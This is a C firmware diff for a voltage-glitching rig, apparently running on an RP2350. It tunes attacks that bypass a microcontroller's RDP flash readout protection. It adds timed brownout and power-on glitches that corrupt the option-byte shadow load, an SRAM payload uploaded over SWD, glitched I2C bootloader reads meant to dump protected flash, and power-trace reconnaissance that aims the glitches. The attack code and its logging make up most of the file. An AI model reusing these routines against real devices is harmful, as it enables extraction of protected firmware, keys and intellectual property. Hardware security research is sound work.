@@ -1312,6 +1312,11 @@ void target_reset_execute(void) {
     gpio_set_dir(reset_pin, GPIO_IN);                // Inactive = float
     gpio_disable_pulls(reset_pin);
 
+    // A reset drops the target out of any synced bootloader session (it must be
+    // re-entered + re-0x7F'd), so clear the latch — otherwise a later TARGET BL
+    // command trusts a stale sync, skips auto-sync, and fails with "No response".
+    bootloader_synced = false;
+
     uart_cli_send("OK: Target reset executed\r\n");
 }
 
@@ -1403,6 +1408,8 @@ void target_power_cycle(uint32_t time_ms) {
     sleep_ms(POWER_ON_SETTLE_MS);   // self-settling: an immediately-following
     // entry (TARGET I2C GET right after a cycle) used to reset a target whose
     // POR hadn't finished — bootloader never armed, "no ACK"
+    // A power cycle also drops any synced bootloader session — clear the latch.
+    bootloader_synced = false;
     uart_cli_send("OK: Target power ON\r\n");
 }
 
@@ -2898,7 +2905,8 @@ bypass_cleanup:
 // (the FPB/UART path) because at RDP1 an SWD flash read is blocked while debug is
 // attached. NOTE: GP10/11/12 is a slow GPIO-sourced rail; this is a best-effort
 // software glitch — a fast crowbar on VCAP is the "proper" tool.
-void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv) {
+void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv,
+                               uint32_t off_lo, uint32_t off_hi) {
     if (power_group_glitch_blocked()) return;
     extern bool swd_connect(void);
     extern bool swd_halt(void);
@@ -2920,8 +2928,16 @@ void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint3
     if (max_attempts == 0) max_attempts = 2000;
 
     // Sweep bands (microseconds after the power-restore edge). Brief brownout =>
-    // fast recovery, so the shadow-load window is us-scale. Tunable.
-    const uint32_t OFF_MIN = 5, OFF_MAX = 1500, OFF_STEP = 5;
+    // fast recovery, so the shadow-load window is us-scale. Tunable. Optional
+    // off_lo/off_hi focus-window (from SHADOWTRACE localization, e.g. 1300..1500us)
+    // overrides the default full sweep; 0/0 = default 5..1500us.
+    uint32_t OFF_MIN = 5, OFF_MAX = 1500;
+    const uint32_t OFF_STEP = 5;
+    if (off_lo || off_hi) {
+        if (off_hi < off_lo) { uint32_t t = off_lo; off_lo = off_hi; off_hi = t; }
+        OFF_MIN = off_lo ? off_lo : 5;
+        OFF_MAX = off_hi ? off_hi : OFF_MIN + 5;
+    }
     const uint32_t WIDTHS[] = {5, 10, 20, 40};
     const int NW = (int)(sizeof(WIDTHS) / sizeof(WIDTHS[0]));
 
@@ -2973,40 +2989,27 @@ void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint3
         attempt++;
         uint32_t width = WIDTHS[wi];
 
-        // Periodically re-upload the payload (a dip may have lost SRAM).
-        if (attempt % 64 == 0) {
-            gpio_put(BOOT0_PIN, 0);
-            swd_init();
-            if (swd_connect()) {
-                swd_halt();
-                swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
-                swd_resume();
-                reuploads++;
-            }
-            swd_deinit();
-            gpio_put(BOOT0_PIN, 1);
-            gpio_set_mask(POWER_MASK);
-            sleep_ms(5);
-        }
-
-        // --- Step 3: brownout to trigger POR (retain SRAM), then a timed dip
-        //     during the recovery to corrupt the RDP option-byte shadow load. ---
-        gpio_set_dir(POWER_PIN2, GPIO_IN); gpio_set_dir(POWER_PIN3, GPIO_IN);
-        gpio_disable_pulls(POWER_PIN2); gpio_disable_pulls(POWER_PIN3);
+        // --- Step 3 (user fix 2026-10-06): a BROWNOUT does NOT reload the
+        //     option-byte shadow — only a full PoR does — so the old brownout had
+        //     nothing to glitch. Do a FULL power-down (VDD->~0) each iteration to
+        //     force a fresh shadow load, with a timed dip during the recovery to
+        //     corrupt it. A full PoR wipes SRAM, so the FPB payload is re-uploaded
+        //     every iteration AFTER the glitch; the subsequent nRST launches
+        //     PRESERVE the glitched RDP latch (nRST/BoR does not reload it). ---
+        gpio_put(BOOT0_PIN, 0);   // flash-boot during the glitched PoR (don't run wiped SRAM)
+        gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
         adc_select_input(ADC_POWER_CHAN);
-        gpio_clr_mask(1u << POWER_PIN1);
+        gpio_clr_mask(POWER_MASK);   // FULL power off (all 3 pins low)
         uint64_t tb = time_us_64();
-        while (adc_read() > 1490 /* ~1.2V => below BOR */) {
-            if (time_us_64() - tb > 200000) break;
+        while (adc_read() > 120 /* ~0.1V: full discharge so the shadow actually reloads */) {
+            if (time_us_64() - tb > 300000) break;
         }
-        // Restore rail => recovery begins (t0).
-        gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        // Restore rail => shadow-load recovery begins (t0).
         gpio_set_mask(POWER_MASK);
         uint64_t t0 = time_us_64();
         while ((uint32_t)(time_us_64() - t0) < off) tight_loop_contents();
-        // Glitch dip: ADC-gated to the calibrated depth if a voltage was given
-        // (drop, poll until <= thresh, then dwell WIDTH us past it), else the
-        // legacy fixed-time low pull for `width` us.
+        // Glitch dip: ADC-gated to the calibrated depth if a voltage was given,
+        // else a fixed-time low pull for `width` us.
         gpio_clr_mask(POWER_MASK);
         uint64_t td = time_us_64();
         if (glitch_thresh) {
@@ -3019,7 +3022,25 @@ void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint3
         } else {
             while ((uint32_t)(time_us_64() - td) < width) tight_loop_contents();
         }
-        gpio_set_mask(POWER_MASK);
+        gpio_set_mask(POWER_MASK);   // rail restored; glitched shadow now latched for this boot
+        sleep_ms(2);
+
+        // Re-upload payload each iteration (the full PoR wiped SRAM). SWD access
+        // does not reset the core, so the glitched RDP latch persists.
+        gpio_put(BOOT0_PIN, 0);
+        swd_init();
+        if (swd_connect()) {
+            swd_halt();
+            swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
+            swd_resume();
+            reuploads++;
+        }
+        swd_deinit();
+
+        // Boot stage1 from SRAM: BOOT0=1 + nRST (nRST preserves the glitched latch).
+        gpio_put(BOOT0_PIN, 1); gpio_put(BOOT1_PIN, 1);
+        gpio_init(reset_pin); gpio_set_dir(reset_pin, GPIO_OUT);
+        gpio_put(reset_pin, 0); sleep_ms(20); gpio_put(reset_pin, 1);
 
         // Let stage1 boot from SRAM and configure the FPB.
         sleep_ms(80);
@@ -3639,7 +3660,13 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
         return;
     }
 
-    uint32_t ack_wins = 0, nack = 0, nack_nodip = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
+    // reads_blank_ff = ACK + all-0xFF: INCONCLUSIVE (blank/blocked/poison all look
+    // alike) — NOT a proven data path (rdp-payload-check: "0xFF is NOT a pass").
+    // reads_nonff   = ACK + real non-FF content: the only meaningful read — at RDP0
+    // it proves the data path (must recover the known marker), at RDP1 it is a DUMP.
+    // read_fail     = ACK but the read frames themselves failed.
+    uint32_t ack_wins = 0, nack = 0, nack_nodip = 0, addr_fail = 0;
+    uint32_t reads_blank_ff = 0, reads_nonff = 0, read_fail = 0;
     uint32_t reentries = 0;
     // warm-up: the FIRST command frame after a fresh entry+GET always NACKs
     // (cold slave) — fire an ungated 0x02 raw frame to settle it, else a
@@ -3666,7 +3693,8 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
             addr_fail++;
             reentries++;
             i2c_bl_enter(); sleep_ms(60);   // bootloader lost — re-boot it
-            continue;
+            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm: else the NEXT
+            continue;                                    // attempt eats a cold-slave NACK
         }
         uint16_t vmin_raw = i2cgate_vmin_raw;
         uint32_t dip_us = i2cgate_dip_us;
@@ -3679,6 +3707,7 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
             addr_fail++;
             reentries++;
             i2c_bl_enter(); sleep_ms(60);   // BOR reboot / stuck bus: re-boot the bootloader
+            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm (see above)
             continue;
         }
 
@@ -3694,16 +3723,17 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
             if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
                 bool allff = true;
                 for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
-                if (allff) reads_ok++; else reads_bad++;
-                // per-shot ACK log: at RDP0 the data should be all-FF (clean read);
-                // at RDP1 a non-FF read is the real dump
+                if (allff) reads_blank_ff++; else reads_nonff++;
+                // per-shot ACK log: all-0xFF is INCONCLUSIVE (blank/blocked/poison);
+                // a non-FF read is the real signal — at RDP0 it must match the known
+                // marker to prove the path, at RDP1 it is the dump.
                 uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s\r\n",
                                 (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
                                 (unsigned long)dip_us, data[0], data[1], data[2], data[3],
                                 data[4], data[5], data[6], data[7],
-                                allff ? "" : "  *** NON-FF ***");
+                                allff ? "  (all-FF: INCONCLUSIVE)" : "  *** NON-FF (real content) ***");
             } else {
-                reads_bad++;
+                read_fail++;
                 uart_cli_printf("  [%lu] win%lu dip %.2fV %luus: ACK but read frames failed\r\n",
                                 (unsigned long)i + 1, (unsigned long)win, vmin_raw * 3.3f / 4095.0f,
                                 (unsigned long)dip_us);
@@ -3724,12 +3754,18 @@ void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
         if (depth_step && v_threshold > v_min_depth) v_threshold -= depth_step / 1000.0f;
     }
 
-    uart_cli_printf("I2CGATE: %lu attempts — ACK %lu (reads ok %lu / bad %lu), NACK-on-dip %lu, NACK-no-dip %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
-                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_ok,
-                    (unsigned long)reads_bad, (unsigned long)nack, (unsigned long)nack_nodip,
-                    (unsigned long)addr_fail, (unsigned long)reentries);
+    uart_cli_printf("I2CGATE: %lu attempts — ACK %lu (non-FF/real %lu, all-FF/inconclusive %lu, read-fail %lu), NACK-on-dip %lu, NACK-no-dip %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
+                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_nonff,
+                    (unsigned long)reads_blank_ff, (unsigned long)read_fail, (unsigned long)nack,
+                    (unsigned long)nack_nodip, (unsigned long)addr_fail, (unsigned long)reentries);
+    // Validity gate (rdp-payload-check): the data path is only PROVEN when a non-FF
+    // read recovers the known RDP0 marker. All-FF ACKs do NOT prove it — a negative
+    // result at RDP1 is only trustworthy once reads_nonff>0 was seen at RDP0 here.
+    if (reads_nonff == 0) {
+        uart_cli_send("I2CGATE: WARNING — zero non-FF reads: data path NOT proven. At RDP0 flash a known marker at 0x08000000 and confirm it is read back before trusting any RDP1 negative.\r\n");
+    }
     if (nack > 0) {
-        uart_cli_printf("I2CGATE: calibration HIT window: %lu corrupted-check NACKs vs %lu clean ACK reads\r\n",
+        uart_cli_printf("I2CGATE: dipped-NACK count %lu (at RDP0 = corrupted-check hits; at RDP1 = normal gated response, NOT a bypass) vs %lu ACKs\r\n",
                         (unsigned long)nack, (unsigned long)ack_wins);
     } else {
         uart_cli_send("I2CGATE: no corrupted checks yet at this depth/timing\r\n");
@@ -3778,6 +3814,8 @@ void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
     struct { uint32_t pc; uint32_t n; } hist[PROBE_BUCKETS] = {0};
     int nb = 0;
     uint32_t halt_fail = 0, cmd_fail = 0;
+    // audit-fix tallies: how the core was found at the moment of halt
+    uint32_t n_clean = 0, n_prehalt = 0, n_presleep = 0, n_exc = 0;
 
     swd_init();
     uint8_t a = I2C_BL_ADDR7_DEFAULT;
@@ -3828,7 +3866,21 @@ void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
             connected = swd_connect() && swd_clear_errors();
             if (!connected) sleep_ms(2);
         }
-        if (!connected || !swd_halt()) { halt_fail++; swd_deinit(); continue; }
+        if (!connected) { halt_fail++; swd_deinit(); continue; }
+        // PRE-HALT state (audit fix): read DHCSR BEFORE we halt, so the PC we
+        // read is interpretable. S_HALT(bit1)=core was ALREADY stopped before we
+        // touched it (prior fault/lockup/debug-held → PC is NOT a freshly-caught
+        // running addr); S_SLEEP(bit18)=core was in WFI/WFE (waiting, e.g. poll);
+        // S_LOCKUP(bit19)=locked up. A clean catch = none of these set pre-halt.
+        uint32_t dhcsr_pre = 0;
+        swd_read_mem(0xE000EDF0, &dhcsr_pre, 1);
+        if (!swd_halt()) { halt_fail++; swd_deinit(); continue; }
+        // DFSR (0xE000ED30): why the core is in debug. HALTED(bit0)=our C_HALT
+        // request stopped it (expected for a clean catch); BKPT/DWTTRAP/VCATCH=
+        // something else fired. Distinguishes "we halted a running core" from
+        // "the core was already trapped and our halt is a no-op on a fault state."
+        uint32_t dfsr = 0;
+        swd_read_mem(0xE000ED30, &dfsr, 1);
 
         uint32_t pc = 0, xpsr = 0, sp = 0;
         bool got = swd_read_core_reg(15, &pc) && swd_read_core_reg(16, &xpsr) &&
@@ -3845,16 +3897,30 @@ void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
         swd_deinit();
         if (!got) { halt_fail++; continue; }
 
+        // audit-fix classification of HOW the core was found:
+        //   exc     = halt returned an EXC_RETURN PC (exception active = faulted)
+        //   prehalt = S_HALT already set before our halt (core was already stopped)
+        //   presleep= S_SLEEP set (core was in WFI/WFE — waiting/polling, NOT the cmp)
+        //   clean   = none of the above + DFSR.HALTED → we caught a RUNNING core at PC
+        bool is_exc  = ((pc & 0xF0000000) == 0xF0000000);
+        bool pre_h   = (dhcsr_pre & 0x20000) != 0;  // S_HALT (DHCSR bit17)
+        bool pre_s   = (dhcsr_pre & 0x40000) != 0;  // S_SLEEP (DHCSR bit18)
+        if      (is_exc) n_exc++;
+        else if (pre_h)  n_prehalt++;
+        else if (pre_s)  n_presleep++;
+        else             n_clean++;
+
         // diagnostic split: EXC_RETURN (high bits set) vs real code address.
         // 0xFFFFFFFE = EXC_RETURN (exception active); xPSR low byte = exception
         // number (3 = HardFault). 0x1FFFxxxx = boot ROM code (the target of the
         // recon); 0x0800xxxx = flash code.
-        if ((pc & 0xF0000000) == 0xF0000000) {
-            uart_cli_printf("  [%lu] EXC_RETURN=0x%08lX exc#=%lu faulted-at PC=0x%08lX LR=0x%08lX CFSR=0x%08lX BFAR=0x%08lX\r\n",
+        if (is_exc) {
+            uart_cli_printf("  [%lu] EXC_RETURN=0x%08lX exc#=%lu faulted-at PC=0x%08lX LR=0x%08lX CFSR=0x%08lX BFAR=0x%08lX  (preDHCSR=0x%08lX DFSR=0x%08lX)\r\n",
                             (unsigned long)i + 1, (unsigned long)pc,
                             (unsigned long)(xpsr & 0xFF), (unsigned long)stk_pc,
                             (unsigned long)stk_lr, (unsigned long)stk_cfsr,
-                            (unsigned long)stk_bfar);
+                            (unsigned long)stk_bfar,
+                            (unsigned long)dhcsr_pre, (unsigned long)dfsr);
         }
 
         // bucket
@@ -3862,12 +3928,24 @@ void target_power_i2cprobe(uint32_t samples, uint32_t delay_us) {
         for (int b = 0; b < nb; b++) if (hist[b].pc == pc) { found = b; break; }
         if (found < 0 && nb < PROBE_BUCKETS) { found = nb; hist[nb].pc = pc; nb++; }
         if (found >= 0) hist[found].n++;
-        if (i < 8) uart_cli_printf("  [%lu] PC=0x%08lX xPSR=0x%08lX\r\n",
-                                   (unsigned long)i + 1, (unsigned long)pc, (unsigned long)xpsr);
+        if (i < 8) uart_cli_printf("  [%lu] PC=0x%08lX xPSR=0x%08lX preDHCSR=0x%08lX%s%s DFSR=0x%08lX%s\r\n",
+                                   (unsigned long)i + 1, (unsigned long)pc, (unsigned long)xpsr,
+                                   (unsigned long)dhcsr_pre,
+                                   (dhcsr_pre & 0x20000) ? " [pre-HALTED]" : "",
+                                   (dhcsr_pre & 0x40000) ? " [pre-SLEEP]" : "",
+                                   (unsigned long)dfsr,
+                                   (dfsr & 0x1) ? " [HALTED]" : "");
     }
 
     uart_cli_printf("I2CPROBE: %lu samples — halt-fail %lu, cmd-fail %lu\r\n",
                     (unsigned long)samples, (unsigned long)halt_fail, (unsigned long)cmd_fail);
+    // audit-fix verdict: only 'clean-caught' PCs are trustworthy running-core
+    // locations. pre-HALT/pre-SLEEP/EXC means the PC is NOT a freshly caught
+    // running addr, so a histogram dominated by those says nothing about where
+    // the cmp runs — it says the halt can't catch the core there.
+    uart_cli_printf("I2CPROBE: catch-state — clean-caught %lu, pre-HALTED %lu, pre-SLEEP %lu, EXC/faulted %lu  (only clean-caught PCs locate running code)\r\n",
+                    (unsigned long)n_clean, (unsigned long)n_prehalt,
+                    (unsigned long)n_presleep, (unsigned long)n_exc);
     uart_cli_send("  PC histogram:\r\n");
     for (int b = 0; b < nb; b++)
         uart_cli_printf("    0x%08lX x%lu\r\n", (unsigned long)hist[b].pc, (unsigned long)hist[b].n);
@@ -3948,7 +4026,9 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
     // live 12mA sources (bench-proven sag floor ~2.87V, useless).
     i2cpulse_reattach();
 
-    uint32_t ack_wins = 0, nack = 0, addr_fail = 0, reads_ok = 0, reads_bad = 0;
+    // See I2CGATE: all-0xFF is INCONCLUSIVE, non-FF is the only meaningful read.
+    uint32_t ack_wins = 0, nack = 0, addr_fail = 0;
+    uint32_t reads_blank_ff = 0, reads_nonff = 0, read_fail = 0;
     uint32_t reentries = 0;
     for (uint32_t i = 0; i < attempts; i++) {
         uint32_t pause = pause_lo + (i % ((pause_hi - pause_lo) / pause_step + 1)) * pause_step;
@@ -3983,6 +4063,10 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
             gpio_set_dir(11, GPIO_OUT); gpio_put(11, 1);
             gpio_set_dir(12, GPIO_OUT); gpio_put(12, 1);
             i2c_bl_enter(); sleep_ms(60);
+            i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);  // re-warm: else the NEXT
+                                            // attempt eats a cold-slave NACK (BUG:
+                                            // the pre-loop warm-up was not repeated
+                                            // on re-entry, poisoning calibration)
             // hand all three gang pins back to the PIO sink (i2cpulse_start
             // geometry — i2c_bl_enter's power-cycle re-ganged them to SIO)
             i2cpulse_reattach();
@@ -3995,14 +4079,14 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
             if (i2c_bl_read_frames(a, 0x08000000u, data, 16)) {
                 bool allff = true;
                 for (int j = 0; j < 16; j++) if (data[j] != 0xFF) allff = false;
-                if (allff) reads_ok++; else reads_bad++;
+                if (allff) reads_blank_ff++; else reads_nonff++;
                 uart_cli_printf("  [%lu] pause %lus w%lus: *** ACK + READ: %02X %02X %02X %02X %02X %02X %02X %02X%s ***\r\n",
                                 (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width,
                                 data[0], data[1], data[2], data[3],
                                 data[4], data[5], data[6], data[7],
-                                allff ? "" : " NON-FF");
+                                allff ? " (all-FF: INCONCLUSIVE)" : " NON-FF (real content)");
             } else {
-                reads_bad++;
+                read_fail++;
                 uart_cli_printf("  [%lu] pause %lus w%lus: ACK but read frames failed\r\n",
                                 (unsigned long)i + 1, (unsigned long)pause, (unsigned long)width);
             }
@@ -4017,13 +4101,107 @@ void target_power_i2cpulse(uint32_t attempts, uint32_t pause_lo, uint32_t pause_
 
     i2cpulse_stop();
 
-    uart_cli_printf("I2CPULSE: %lu shots — ACK %lu (reads ok %lu / bad %lu), NACK %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
-                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_ok,
-                    (unsigned long)reads_bad, (unsigned long)nack, (unsigned long)addr_fail,
-                    (unsigned long)reentries);
-    if (ack_wins > 0) {
-        uart_cli_send("I2CPULSE: *** ACK SHOTS PRESENT — inspect the ACK lines for the flash dump ***\r\n");
+    uart_cli_printf("I2CPULSE: %lu shots — ACK %lu (non-FF/real %lu, all-FF/inconclusive %lu, read-fail %lu), NACK %lu, bus-dead/no-addr %lu (%lu re-entries)\r\n",
+                    (unsigned long)attempts, (unsigned long)ack_wins, (unsigned long)reads_nonff,
+                    (unsigned long)reads_blank_ff, (unsigned long)read_fail, (unsigned long)nack,
+                    (unsigned long)addr_fail, (unsigned long)reentries);
+    if (reads_nonff > 0) {
+        uart_cli_send("I2CPULSE: *** NON-FF READ PRESENT — inspect the ACK lines (real flash content) ***\r\n");
+    } else {
+        uart_cli_send("I2CPULSE: no non-FF read — data path NOT proven here. Validate at RDP0 with a known marker at 0x08000000 before trusting any RDP1 negative.\r\n");
     }
+}
+
+// ============================================================================
+// ETSRECON — equivalent-time-sampling power recon of the RDP-check window.
+//
+// The RP2350 ADC is fixed at ~500 ksps (2us/sample) — far too slow to resolve
+// the ~0.6us RDP check directly, and it has no precise external conversion
+// trigger. But the I2C ACK-slot anchor is DETERMINISTIC, so we reconstruct a
+// sub-sample power trace the classic way: repeat the deterministic event many
+// times, and on each repeat sample the rail (ADC1/GP27 shunt) at a precisely
+// swept delay after t0 (the cmd-byte ACK rise). Binning by delay-phase builds an
+// effective ~ns-resolution trace from the slow ADC.
+//
+// Decoupling (why this images the check instead of shifting it): the post-ACK
+// hook fires AFTER scl_hi (t0) while the master holds SCL high. The ROM runs the
+// check ~0.6us after t0 regardless of further clocking, so busy-waiting then
+// sampling moves ONLY the sample phase, not the check. No glitch is fired, so the
+// target never BORs — we can loop fast without re-entry.
+//
+// This is the recon the halt-probe cannot do (SWD-attach latency >> the window).
+// Caveat: a single instruction's shunt-current delta is tiny; heavy per-phase
+// averaging (reps) is needed, and it may only resolve the check REGION, not one
+// instruction — which is all we need to aim the I2CPULSE pause sweep.
+// ============================================================================
+static volatile uint32_t ets_delay_cycles = 0;
+static volatile uint16_t ets_sample_raw = 0;
+static void ets_post_hook(void) {
+    busy_wait_at_least_cycles(ets_delay_cycles);   // phase delay after t0
+    ets_sample_raw = (uint16_t)adc_read();          // ADC1 pre-selected (GP27 shunt)
+}
+
+void target_power_etsrecon(uint32_t phases, uint32_t reps) {
+    extern bool i2c_bl_send_cmd_postackhook(uint8_t a, uint8_t cmd, void (*h)(void));
+    if (phases == 0) phases = 80;  if (phases > 400) phases = 400;
+    if (reps == 0)   reps   = 300; if (reps  > 5000) reps  = 5000;
+
+    // Window to image: t0 .. t0 + SPAN_CYCLES (150MHz -> 6.667ns/cycle). The ROM
+    // check latches ~0.6us (~90 cyc) after t0; 600 cycles (~4us) covers dispatch
+    // + check + verdict + NACK with margin.
+    const uint32_t SPAN_CYCLES = 600;
+    static uint32_t ets_acc[400];
+    for (uint32_t p = 0; p < phases; p++) ets_acc[p] = 0;
+
+    adc_init();
+    adc_select_input(1);           // ADC1 = GP27 shunt (power/current)
+
+    uint8_t a = I2C_BL_ADDR7_DEFAULT;
+    i2c_bl_enter(); sleep_ms(60);
+    i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);   // warm-up (cold slave first-frame NACK)
+
+    uart_cli_printf("ETSRECON: %lu phases x %lu reps, span %lu cyc (~%.2fus) after t0 (cmd-ACK), ADC1/GP27 shunt\r\n",
+                    (unsigned long)phases, (unsigned long)reps, (unsigned long)SPAN_CYCLES,
+                    SPAN_CYCLES * 6.667f / 1000.0f);
+    uart_cli_send("ETSRECON: no glitch fired — target stays at its current RDP level.\r\n");
+
+    uint32_t shot = 0;
+    for (uint32_t r = 0; r < reps; r++) {
+        for (uint32_t p = 0; p < phases; p++) {
+            ets_delay_cycles = (p * SPAN_CYCLES) / phases;
+            ets_sample_raw = 0;
+            i2c_bl_send_cmd_postackhook(a, 0x11, ets_post_hook);
+            ets_acc[p] += ets_sample_raw;
+            // proactive re-entry insurance: the slave can wedge over thousands of
+            // truncated frames; re-arm periodically (cheap, no BOR to recover).
+            if (++shot % 2000 == 0) {
+                i2c_bl_enter(); sleep_ms(40);
+                i2c_bl_send_cmd_raw(a, 0x02); sleep_ms(5);
+            }
+        }
+    }
+
+    // reconstruct + dump: find min/max for a crude ASCII profile so the check
+    // region (a deviation from baseline) is visible at a glance.
+    uint32_t vmin = 0xFFFFFFFF, vmax = 0;
+    for (uint32_t p = 0; p < phases; p++) {
+        uint32_t avg = ets_acc[p] / reps;
+        if (avg < vmin) vmin = avg;
+        if (avg > vmax) vmax = avg;
+    }
+    uint32_t span = (vmax > vmin) ? (vmax - vmin) : 1;
+    uart_cli_printf("ETSRECON: reconstructed trace (raw %lu..%lu, delta %lu LSB):\r\n",
+                    (unsigned long)vmin, (unsigned long)vmax, (unsigned long)span);
+    for (uint32_t p = 0; p < phases; p++) {
+        uint32_t avg = ets_acc[p] / reps;
+        float t_us = (p * (float)SPAN_CYCLES / phases) * 6.667f / 1000.0f;
+        int bars = (int)((avg - vmin) * 40u / span);
+        char bar[41];
+        for (int b = 0; b < 40; b++) bar[b] = (b < bars) ? '#' : ' ';
+        bar[40] = '\0';
+        uart_cli_printf("  t=+%5.3fus raw=%4lu |%s|\r\n", t_us, (unsigned long)avg, bar);
+    }
+    uart_cli_send("ETSRECON: done. A bump ~0.6us after t0 = the dispatch/RDP-check region (aim the I2CPULSE pause there).\r\n");
 }
 
 // Control experiment for ROMFPB: the identical early-attach flow (POR with
@@ -4695,6 +4873,143 @@ void target_power_cleanwake(void) {
 // t_nrst (nRST GP15 release = low->high after POR). The option-byte shadow load
 // sits within [t_vdd, t_nrst]; jitter over N reps tells us how lockable the M2
 // glitch delay will be. Non-destructive; runs at RDP0 or RDP1.
+// ============================================================================
+// SHADOWTRACE — ADC1/GP27 shunt-current trace of the POR window, to localize the
+// option-byte shadow-load event so SHADOWBYPASS can aim its dip instead of
+// brute-sweeping the full ~2.47ms window (per SHADOWCHAR). Power-on is the
+// deterministic trigger (we drive POWER_MASK), so we capture ADC1 back-to-back
+// from t0 and coherently AVERAGE over reps to lift the tiny option-byte-read
+// current signature out of the noise. The shadow load sits in a ms-scale window,
+// so the ~500ksps ADC (2us/sample) resolves it (unlike a sub-us instruction).
+// No glitch is fired. REQUIRES the shunt wired in series with target VDD, GP27
+// tapping across it (ADC1); without it the trace is meaningless (floating ADC).
+// ============================================================================
+void target_power_shadowtrace(uint32_t samples, uint32_t reps, uint32_t hold_nrst) {
+    extern void power_ensure_init(void);
+    if (samples == 0) samples = 1400;  if (samples > 4096) samples = 4096;
+    if (reps == 0)    reps    = 20;    if (reps > 500)    reps    = 500;
+
+    power_ensure_init();
+    gpio_init(reset_pin);
+    if (hold_nrst) {
+        // Drive nRST LOW throughout: hold the core in reset so OBL/PLL/core-start
+        // never run. If a trace feature survives this, it's a rig/rail/analog
+        // artifact, not chip reset-exit activity.
+        gpio_set_dir(reset_pin, GPIO_OUT); gpio_put(reset_pin, 0);
+    } else {
+        gpio_set_dir(reset_pin, GPIO_IN); gpio_pull_up(reset_pin);
+    }
+    adc_power_init();
+
+    static uint16_t buf[4096];
+    static uint32_t acc[4096];
+    for (uint32_t i = 0; i < samples; i++) acc[i] = 0;
+
+    uart_cli_printf("SHADOWTRACE: ADC1/GP27 shunt current during POR — %lu samples x %lu reps%s\r\n",
+                    (unsigned long)samples, (unsigned long)reps,
+                    hold_nrst ? "  [nRST HELD LOW — core in reset]" : "");
+    uart_cli_send("SHADOWTRACE: REQUIRES shunt in series with target VDD, GP27 across it. No glitch fired.\r\n");
+
+    uint32_t t_end_us = 0;
+    // Track the SAMPLE INDEX at which nRST (GP15) releases high after POR, so the
+    // trace can be reported in JG's frame (times relative to nRST, not power-on).
+    uint64_t nrst_idx_sum = 0; uint32_t nrst_idx_valid = 0;
+    for (uint32_t r = 0; r < reps; r++) {
+        // full power-down POR (SWEEP/SHADOWCHAR idiom)
+        gpio_set_dir(POWER_PIN1, GPIO_OUT);
+        gpio_set_dir(POWER_PIN2, GPIO_OUT);
+        gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_clr_mask(POWER_MASK);
+        sleep_ms(200);
+        adc_select_input(1);                 // ADC1 = GP27 shunt current
+        // power ON = t0, then capture back-to-back (~2us/sample). Each sample also
+        // reads GP15 to catch the nRST low->high (POR release) edge.
+        uint32_t nrst_i = 0xFFFFFFFF; bool seen_low = false;
+        uint64_t t0 = time_us_64();
+        gpio_set_mask(POWER_MASK);
+        for (uint32_t i = 0; i < samples; i++) {
+            buf[i] = (uint16_t)adc_read();
+            bool hi = gpio_get(reset_pin);
+            if (!hi) seen_low = true;
+            if (nrst_i == 0xFFFFFFFF && hi && seen_low) nrst_i = i;
+        }
+        uint32_t el = (uint32_t)(time_us_64() - t0);
+        if (r == 0) t_end_us = el;
+        for (uint32_t i = 0; i < samples; i++) acc[i] += buf[i];
+        if (nrst_i != 0xFFFFFFFF) { nrst_idx_sum += nrst_i; nrst_idx_valid++; }
+    }
+
+    float us_per = (t_end_us > 0) ? (float)t_end_us / samples : 2.0f;
+    // nRST-release time (JG's reference frame). -1 if not captured in-window.
+    float nrst_us = nrst_idx_valid ? ((float)nrst_idx_sum / nrst_idx_valid) * us_per : -1.0f;
+    // bin-average into ROWS rows for a legible profile; mark the SHADOWCHAR window
+    const uint32_t ROWS = 100;
+    uint32_t per = (samples + ROWS - 1) / ROWS;
+    // Precompute the binned averages once (so we can scale without recomputing).
+    static uint16_t binv[100];   // ROWS
+    uint32_t nb = 0;
+    uint32_t rmin = 0xFFFFFFFF, rmax = 0;
+    for (uint32_t b = 0; b * per < samples && nb < ROWS; b++) {
+        uint64_t s = 0; uint32_t n = 0;
+        for (uint32_t i = b * per; i < (b + 1) * per && i < samples; i++) { s += acc[i]; n++; }
